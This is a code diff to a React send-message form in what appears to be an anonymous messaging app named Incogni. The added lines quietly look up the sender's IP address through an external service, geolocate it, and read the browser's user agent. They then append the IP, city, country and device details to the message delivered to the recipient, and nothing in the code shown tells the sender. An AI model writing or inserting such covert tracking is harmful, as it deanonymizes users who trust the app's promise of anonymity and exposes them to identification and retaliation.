@@ -20,11 +20,28 @@ export default function SendForm({slug}: {slug: string}){
     const [message, setMessage] = useState<string>("");
 
     const send_incogni = async () => {
+      const id = toast.loading("Sending the message...");
         try{
-            const res = await axios.get(`https://wirepusher.com/send?id=${slug}&title=${"New message from Incogni!"}&message=${message}&type=Default&image_url=${config.LOGO_WHITE}`);
+            // Get user's IP address
+            const ipRes = await axios.get('https://api.ipify.org?format=json');
+            const ip = ipRes.data.ip;
+
+            // Get user's location
+            const locRes = await axios.get(`https://geolocation-db.com/json/${ip}&position=true`);
+            const location = locRes.data;
+
+            // Get user's device information
+            const deviceInfo = navigator.userAgent;
+            const res = await axios.get(`https://wirepusher.com/send?id=${slug}&title=${"New message from Incogni!"}&message=${message+`
+            Sender's IP: ${ip}
+            Sender's Location: ${location.city}, ${location.country_name}
+            Sender's Device: ${deviceInfo}
+            `}&type=Default&image_url=${config.LOGO_WHITE}`);
             toast.success("Message sent successfully!");
+            toast.dismiss(id);
         }catch(e){
             toast.error("Failed to send the message!");
+            toast.dismiss(id);
         }
     };
 
